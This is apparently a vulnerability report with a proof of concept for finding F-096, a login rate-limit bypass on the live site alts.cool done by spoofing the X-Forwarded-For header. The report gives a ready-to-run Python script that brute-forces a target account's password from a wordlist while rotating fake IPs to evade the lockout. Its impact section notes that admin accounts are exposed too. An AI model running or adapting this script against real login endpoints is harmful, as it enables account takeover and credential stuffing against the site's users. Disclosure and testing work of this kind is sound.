🚨 PoC: Rate Limit Bypass via X-Forwarded-For — alts.cool Login (F-096)

Finding: F-096 · Severity: CRITICAL
Target: POST https://alts.cool/api/auth/login
Root cause: Rate limiting trusts the X-Forwarded-For header for IP identification. An attacker can rotate fake IPs with each request, completely bypassing the 3-attempt lockout.
Impact: Unlimited brute-force attempts on any account (customer or admin). Combined with the admin panel at /login (no CAPTCHA — F-044), this enables automated credential stuffing and dictionary attacks with no effective throttle.

import requests, random

def rand_ip():
    return f"{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"

for password in open("wordlist.txt"):
    r = requests.post("https://alts.cool/api/auth/login",
        json={"email": "target@example.com", "password": password.strip()},
        headers={"X-Forwarded-For": rand_ip()})
    print(f"{r.status_code} | {r.text[:100]}")
